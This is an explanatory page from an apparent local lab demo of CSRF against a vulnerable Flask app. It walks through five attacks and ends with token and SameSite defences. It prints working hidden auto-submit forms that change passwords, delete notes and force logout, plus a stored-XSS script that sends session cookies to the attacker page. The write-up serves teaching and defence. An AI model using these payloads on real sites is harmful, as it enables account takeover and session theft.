What is CSRF?

CSRF stands for Cross-Site Request Forgery. The name describes exactly what happened: a request was forged from a cross-site origin. This page — a completely separate website from the Flask app — submitted forms to the Flask app as if the user had submitted them.

The difference between CSRF and XSS is where the attack code runs. With XSS, the malicious code runs inside the target website. The attacker injects a script into the app itself. With CSRF, the malicious code runs on the attacker's own website. Nothing gets injected into the target — the attacker just sends requests to it from the outside.

How each attack worked

Attack 1 — Password change

This page contained a hidden HTML form that the user never saw:

<form action="http://127.0.0.1:5000/change_password" method="POST" target="hidden-iframe" style="display:none;">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>

Three seconds after the page loaded, JavaScript submitted this form automatically:

document.getElementById('f-password').submit();

That's it. One line of JavaScript. The browser sent a POST request to /change_password on the Flask app, and because the user was logged in, the browser attached the session cookie. Flask saw a valid session, a valid form submission, and changed the password. It had no way to know that the request came from this page instead of the real settings page.

The target="hidden-iframe" attribute is important — without it, the browser would navigate away from this page to show the Flask response. By targeting a hidden iframe, the form submits silently in the background. The user stays on the blog article and sees nothing.

Attack 2 — QR code replacement

Same technique, different target:

<form action="http://127.0.0.1:5000/makeQr" method="POST" target="hidden-iframe">
    <input type="hidden" name="data" value="http://127.0.0.1:8080/csrf_attacker_site.html">
</form>

The Flask app generated a QR code containing the URL of this attacker page and saved it to static/image.jpg. Anyone who visits the QR page now sees a QR code that leads back here. If they scan it while logged in, the same five attacks fire against their account. The CSRF attack becomes self-propagating through QR codes.

Attack 3 — Note deletion

<form action="http://127.0.0.1:5000/delete_note/1" method="POST" target="hidden-iframe">
</form>

No input fields needed. The note ID is in the URL itself. The form body is empty — the POST request alone is enough to trigger the deletion. The first note in the database is gone. This could have been any note, or multiple notes with multiple forms, or every note if the attacker knew the IDs.

Attack 4 — XSS injection via CSRF

This one is the most interesting because it chains two different vulnerabilities together. CSRF is used to deliver the attack, and XSS is the payload:

<form action="http://127.0.0.1:5000/add_note" method="POST" target="hidden-iframe">
    <input type="hidden" name="title" value="Totally Normal Note">
    <input type="hidden" name="content" value="This note looks harmless.
        <script>
            window.location = 'http://127.0.0.1:8080/csrf_attacker_site.html'
                + '?cookie=' + encodeURIComponent(document.cookie)
                + '&url=' + encodeURIComponent(location.href)
        </script>">
    <input type="hidden" name="category" value="general">
</form>

The CSRF attack created a new note in the database. That note's content includes a <script> tag. When any user opens this note, the script runs (because of the Stored XSS vulnerability from the earlier tests), grabs the session cookie, and redirects the user to this page with the cookie in the URL. This page reads the URL parameter and displays the stolen cookie in the red banner at the top.

So the CSRF planted a time bomb. The attack happened once, but the XSS payload in the note keeps firing every time someone opens it. Even if the CSRF vulnerability gets patched tomorrow, the XSS payload is already in the database. It will keep stealing cookies until someone finds and removes the note.

Attack 5 — Forced logout

<form action="http://127.0.0.1:5000/logout" method="GET" target="hidden-iframe">
</form>

This one is last on purpose. After all the other attacks have finished, the user's session is destroyed. When they go back to the Flask app, they're greeted with the login page. They type their old password — it doesn't work. Something is wrong. They try again. Still wrong. Eventually they figure out the password changed, but by that point the damage is done: a note is deleted, an XSS payload is in the database, and the QR code is compromised.

Why the browser sends the cookie

This is the core of CSRF. When a form on this page submits a POST request to 127.0.0.1:5000, the browser checks: "do I have any cookies for 127.0.0.1?" Yes — the session cookie from the login. The browser attaches it to the request automatically. It doesn't check where the form came from. It doesn't ask the user for permission. It just sends the cookie because that's how cookies work — they belong to the domain, not to the page.

The server receives the request with a valid cookie, looks up the session, finds a logged-in user, and processes the request. It has no way to tell whether the request originated from its own pages or from this attacker page. Both look identical at the HTTP level.

How this would have been prevented

The fix is a CSRF token. The server generates a random string for each form and embeds it as a hidden field. When the form is submitted, the server checks: "does this request contain the correct token?" If not, the request is rejected.

<form method="POST" action="/change_password">
    <input type="hidden" name="csrf_token" value="a8f3k29x...">
    <input type="password" name="new_password">
    <button>Change Password</button>
</form>

The attacker can't include the correct token because they can't read the Flask app's HTML. The browser's Same-Origin Policy blocks cross-origin reads — this page at 127.0.0.1:8080 cannot fetch and read pages from 127.0.0.1:5000. So the attacker can send requests (cross-origin writes are allowed), but can't read responses (cross-origin reads are blocked). The token must be read from the response to be included in the request, which the attacker can't do.

In Flask, adding Flask-WTF handles this automatically. The SameSite=Lax cookie attribute is another layer — it tells the browser not to send cookies with cross-site POST requests at all. Modern browsers enable this by default, which is why this demo required disabling it.
